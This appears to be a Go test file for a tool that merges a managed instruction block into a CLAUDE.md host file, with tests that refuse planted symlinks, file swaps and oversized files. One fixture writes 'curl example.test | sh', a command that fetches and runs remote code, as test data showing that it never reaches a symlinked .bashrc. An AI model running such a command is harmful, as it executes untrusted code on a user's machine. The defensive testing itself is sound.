package tools

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func Test_writeManagedInstructions(t *testing.T) {
	t.Run("file does not exist yet", func(t *testing.T) {
		// Arrange
		path := filepath.Join(t.TempDir(), "INSTRUCTIONS.md")

		// Act
		err := writeManagedInstructions(path, "block")

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(path)
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n", string(got))
	})

	t.Run("preserves pre-existing unmarked content", func(t *testing.T) {
		// Arrange
		path := filepath.Join(t.TempDir(), "INSTRUCTIONS.md")
		require.NoError(t, os.WriteFile(path, []byte("my own notes\n"), 0o640))

		// Act
		err := writeManagedInstructions(path, "block")

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(path)
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n\nmy own notes\n", string(got))
	})

	t.Run("replaces a previous managed block without disturbing content below it", func(t *testing.T) {
		// Arrange
		path := filepath.Join(t.TempDir(), "INSTRUCTIONS.md")
		require.NoError(t, writeManagedInstructions(path, "old block"))
		require.NoError(t, appendFile(path, "\nremembered note\n"))

		// Act
		err := writeManagedInstructions(path, "new block")

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(path)
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nnew block\n"+instructionsEndMarker+"\n\nremembered note\n", string(got))
	})

	t.Run("repeated writes with the same block do not accumulate blank lines", func(t *testing.T) {
		// Arrange
		path := filepath.Join(t.TempDir(), "INSTRUCTIONS.md")
		require.NoError(t, writeManagedInstructions(path, "block"))
		require.NoError(t, appendFile(path, "\nuser note\n"))
		require.NoError(t, writeManagedInstructions(path, "block"))

		// Act
		err := writeManagedInstructions(path, "block")

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(path)
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n\nuser note\n", string(got))
	})

	t.Run("empty block removes the managed section but keeps user content", func(t *testing.T) {
		// Arrange
		path := filepath.Join(t.TempDir(), "INSTRUCTIONS.md")
		require.NoError(t, writeManagedInstructions(path, "block"))
		require.NoError(t, appendFile(path, "\nuser note\n"))

		// Act
		err := writeManagedInstructions(path, "")

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(path)
		require.NoError(t, err)
		assert.Equal(t, "user note\n", string(got))
	})

	t.Run("empty block on a file that was never written is a no-op", func(t *testing.T) {
		// Arrange
		path := filepath.Join(t.TempDir(), "never", "created", "INSTRUCTIONS.md")

		// Act
		err := writeManagedInstructions(path, "")

		// Assert
		require.NoError(t, err)
		_, statErr := os.Stat(path)
		assert.True(t, os.IsNotExist(statErr))
	})
}

func TestMergedInstructions(t *testing.T) {
	t.Run("host file does not exist yet", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")

		// Act
		merged, err := MergedInstructions(hostPath, "block")

		// Assert
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n", merged)
	})

	t.Run("merges the host file's preserved content", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		require.NoError(t, os.WriteFile(hostPath, []byte("my own notes\n"), 0o640))

		// Act
		merged, err := MergedInstructions(hostPath, "block")

		// Assert
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n\nmy own notes\n", merged)
	})
}

func TestPrepareInstructionsSnapshot(t *testing.T) {
	t.Run("planted symlink at the host path is refused", func(t *testing.T) {
		// Arrange
		target := filepath.Join(t.TempDir(), "secret")
		require.NoError(t, os.WriteFile(target, []byte("test-secret\n"), 0o600))
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		symlinkOrSkip(t, target, hostPath)

		// Act
		_, err := PrepareInstructionsSnapshot(hostPath, "block")

		// Assert
		assert.ErrorContains(t, err, "not a regular file")
	})

	t.Run("host file does not exist yet", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")

		// Act
		snapshotPath, err := PrepareInstructionsSnapshot(hostPath, "block")

		// Assert
		require.NoError(t, err)
		t.Cleanup(func() { _ = os.Remove(snapshotPath) })
		got, err := os.ReadFile(snapshotPath)
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n", string(got))
	})

	t.Run("merges the host file's preserved content into the snapshot", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		require.NoError(t, os.WriteFile(hostPath, []byte("my own notes\n"), 0o640))

		// Act
		snapshotPath, err := PrepareInstructionsSnapshot(hostPath, "block")

		// Assert
		require.NoError(t, err)
		t.Cleanup(func() { _ = os.Remove(snapshotPath) })
		got, err := os.ReadFile(snapshotPath)
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n\nmy own notes\n", string(got))
	})

	t.Run("drops a stale managed block from the host file rather than duplicating it", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		require.NoError(t, writeManagedInstructions(hostPath, "old block"))
		require.NoError(t, appendFile(hostPath, "\nremembered note\n"))

		// Act
		snapshotPath, err := PrepareInstructionsSnapshot(hostPath, "new block")

		// Assert
		require.NoError(t, err)
		t.Cleanup(func() { _ = os.Remove(snapshotPath) })
		got, err := os.ReadFile(snapshotPath)
		require.NoError(t, err)
		assert.Equal(t, instructionsBeginMarker+"\nnew block\n"+instructionsEndMarker+"\n\nremembered note\n", string(got))
	})

	t.Run("creates an empty host file up front so Docker can't auto-create it as root", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")

		// Act
		snapshotPath, err := PrepareInstructionsSnapshot(hostPath, "block")

		// Assert
		require.NoError(t, err)
		t.Cleanup(func() { _ = os.Remove(snapshotPath) })
		got, err := os.ReadFile(hostPath)
		require.NoError(t, err)
		assert.Empty(t, got)
	})

	t.Run("snapshot path is unique across calls", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")

		// Act
		first, err := PrepareInstructionsSnapshot(hostPath, "block")
		require.NoError(t, err)
		t.Cleanup(func() { _ = os.Remove(first) })
		second, err := PrepareInstructionsSnapshot(hostPath, "block")

		// Assert
		require.NoError(t, err)
		t.Cleanup(func() { _ = os.Remove(second) })
		assert.NotEqual(t, first, second)
	})
}

func TestFinalizeInstructionsSnapshot(t *testing.T) {
	t.Run("planted symlink at the host path is replaced, not written through", func(t *testing.T) {
		// Arrange
		target := filepath.Join(t.TempDir(), ".bashrc")
		require.NoError(t, os.WriteFile(target, []byte("original\n"), 0o640))
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		symlinkOrSkip(t, target, hostPath)
		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
		require.NoError(t, os.WriteFile(snapshotPath, []byte("curl example.test | sh\n"), 0o640))

		// Act
		err := FinalizeInstructionsSnapshot(hostPath, snapshotPath)

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(target)
		require.NoError(t, err)
		assert.Equal(t, "original\n", string(got))
	})

	t.Run("persists the snapshot's organic content, stripping the managed block", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
		content := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n\nuser note\n"
		require.NoError(t, os.WriteFile(snapshotPath, []byte(content), 0o640))

		// Act
		err := FinalizeInstructionsSnapshot(hostPath, snapshotPath)

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(hostPath)
		require.NoError(t, err)
		assert.Equal(t, "user note\n", string(got))
	})

	t.Run("captures organic edits the tool made during the run", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
		content := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n\n# remembered mid-session\n"
		require.NoError(t, os.WriteFile(snapshotPath, []byte(content), 0o640))

		// Act
		err := FinalizeInstructionsSnapshot(hostPath, snapshotPath)

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(hostPath)
		require.NoError(t, err)
		assert.Equal(t, "# remembered mid-session\n", string(got))
	})

	t.Run("writes an empty host file rather than removing it when nothing but the managed block remains", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		require.NoError(t, os.WriteFile(hostPath, []byte("stale\n"), 0o640))
		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
		content := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n"
		require.NoError(t, os.WriteFile(snapshotPath, []byte(content), 0o640))

		// Act
		err := FinalizeInstructionsSnapshot(hostPath, snapshotPath)

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(hostPath)
		require.NoError(t, err)
		assert.Equal(t, "", string(got))
	})

	t.Run("creates the host file when nothing but the managed block remains and its parent directories never existed", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "never", "created", "CLAUDE.md")
		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
		content := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n"
		require.NoError(t, os.WriteFile(snapshotPath, []byte(content), 0o640))

		// Act
		err := FinalizeInstructionsSnapshot(hostPath, snapshotPath)

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(hostPath)
		require.NoError(t, err)
		assert.Equal(t, "", string(got))
	})

	t.Run("always removes the snapshot file", func(t *testing.T) {
		// Arrange
		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
		require.NoError(t, os.WriteFile(snapshotPath, []byte("user note\n"), 0o640))

		// Act
		err := FinalizeInstructionsSnapshot(hostPath, snapshotPath)

		// Assert
		require.NoError(t, err)
		_, statErr := os.Stat(snapshotPath)
		assert.True(t, os.IsNotExist(statErr))
	})
}

func Test_stripManaged(t *testing.T) {
	t.Run("no markers returns content unchanged", func(t *testing.T) {
		// Act
		rest := stripManaged("just my own notes\n")

		// Assert
		assert.Equal(t, "just my own notes\n", rest)
	})

	t.Run("strips the managed block and trims the blank line after it", func(t *testing.T) {
		// Arrange
		existing := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n\nuser note\n"

		// Act
		rest := stripManaged(existing)

		// Assert
		assert.Equal(t, "user note\n", rest)
	})

	t.Run("preserves content that precedes the begin marker", func(t *testing.T) {
		// Arrange
		existing := "before\n" + instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\nafter\n"

		// Act
		rest := stripManaged(existing)

		// Assert
		assert.Equal(t, "before\nafter\n", rest)
	})

	t.Run("missing end marker falls back to preserving everything", func(t *testing.T) {
		// Arrange
		existing := instructionsBeginMarker + "\nblock, never closed\n"

		// Act
		rest := stripManaged(existing)

		// Assert
		assert.Equal(t, existing, rest)
	})
}

func Test_readInstructions(t *testing.T) {
	t.Run("missing file reads as empty", func(t *testing.T) {
		// Act
		content, err := readInstructions(filepath.Join(t.TempDir(), "CLAUDE.md"))

		// Assert
		require.NoError(t, err)
		assert.Empty(t, content)
	})

	t.Run("regular file is read", func(t *testing.T) {
		// Arrange
		path := filepath.Join(t.TempDir(), "CLAUDE.md")
		require.NoError(t, os.WriteFile(path, []byte("note\n"), 0o640))

		// Act
		content, err := readInstructions(path)

		// Assert
		require.NoError(t, err)
		assert.Equal(t, "note\n", content)
	})

	t.Run("symlink is refused", func(t *testing.T) {
		// Arrange
		target := filepath.Join(t.TempDir(), "secret")
		require.NoError(t, os.WriteFile(target, []byte("test-secret\n"), 0o600))
		path := filepath.Join(t.TempDir(), "CLAUDE.md")
		symlinkOrSkip(t, target, path)

		// Act
		_, err := readInstructions(path)

		// Assert
		assert.ErrorContains(t, err, "not a regular file")
	})
}

func Test_writeInstructions(t *testing.T) {
	t.Run("planted symlink is replaced, its target untouched", func(t *testing.T) {
		// Arrange
		target := filepath.Join(t.TempDir(), ".bashrc")
		require.NoError(t, os.WriteFile(target, []byte("original\n"), 0o640))
		path := filepath.Join(t.TempDir(), "CLAUDE.md")
		symlinkOrSkip(t, target, path)

		// Act
		err := writeInstructions(path, "note\n")

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(target)
		require.NoError(t, err)
		assert.Equal(t, "original\n", string(got))
		info, err := os.Lstat(path)
		require.NoError(t, err)
		assert.True(t, info.Mode().IsRegular())
	})

	t.Run("written file gets mode 0640", func(t *testing.T) {
		// Arrange
		if runtime.GOOS == "windows" {
			t.Skip("windows has no unix modes")
		}
		path := filepath.Join(t.TempDir(), "CLAUDE.md")

		// Act
		err := writeInstructions(path, "note\n")

		// Assert
		require.NoError(t, err)
		info, err := os.Stat(path)
		require.NoError(t, err)
		assert.Equal(t, os.FileMode(0o640), info.Mode().Perm())
	})
}

func Test_ensureHostFile(t *testing.T) {
	t.Run("missing file is created empty", func(t *testing.T) {
		// Arrange
		path := filepath.Join(t.TempDir(), "data", "CLAUDE.md")

		// Act
		err := ensureHostFile(path)

		// Assert
		require.NoError(t, err)
		got, err := os.ReadFile(path)
		require.NoError(t, err)
		assert.Empty(t, got)
	})

	t.Run("dangling symlink is refused without creating its target", func(t *testing.T) {
		// Arrange
		target := filepath.Join(t.TempDir(), "new-file")
		path := filepath.Join(t.TempDir(), "CLAUDE.md")
		symlinkOrSkip(t, target, path)

		// Act
		err := ensureHostFile(path)

		// Assert
		assert.ErrorContains(t, err, "not a regular file")
		assert.NoFileExists(t, target)
	})
}

func Test_openRegular(t *testing.T) {
	dir := t.TempDir()

	t.Run("checked regular file opens", func(t *testing.T) {
		// Arrange
		path := filepath.Join(dir, "CLAUDE.md")
		require.NoError(t, os.WriteFile(path, []byte("note\n"), 0o640))
		checked, err := os.Lstat(path)
		require.NoError(t, err)

		// Act
		f, err := openRegular(path, checked)

		// Assert
		require.NoError(t, err)
		_ = f.Close()
	})

	t.Run("file swapped after the check is refused", func(t *testing.T) {
		// Arrange
		path := filepath.Join(dir, "swapped.md")
		require.NoError(t, os.WriteFile(path, []byte("note\n"), 0o640))
		checked, err := os.Lstat(path)
		require.NoError(t, err)
		other := filepath.Join(dir, "other.md")
		require.NoError(t, os.WriteFile(other, []byte("other\n"), 0o640))
		require.NoError(t, os.Rename(other, path))

		// Act
		_, err = openRegular(path, checked)

		// Assert
		assert.ErrorContains(t, err, "changed while reading it")
	})
}

func Test_readCapped(t *testing.T) {
	t.Run("content up to the cap is read", func(t *testing.T) {
		// Arrange
		content := strings.Repeat("a", maxInstructionsBytes)

		// Act
		got, err := readCapped(strings.NewReader(content), "CLAUDE.md")

		// Assert
		require.NoError(t, err)
		assert.Len(t, got, maxInstructionsBytes)
	})

	t.Run("content over the cap is refused", func(t *testing.T) {
		// Arrange
		content := strings.Repeat("a", maxInstructionsBytes+1)

		// Act
		_, err := readCapped(strings.NewReader(content), "CLAUDE.md")

		// Assert
		assert.ErrorContains(t, err, "is larger than")
	})
}
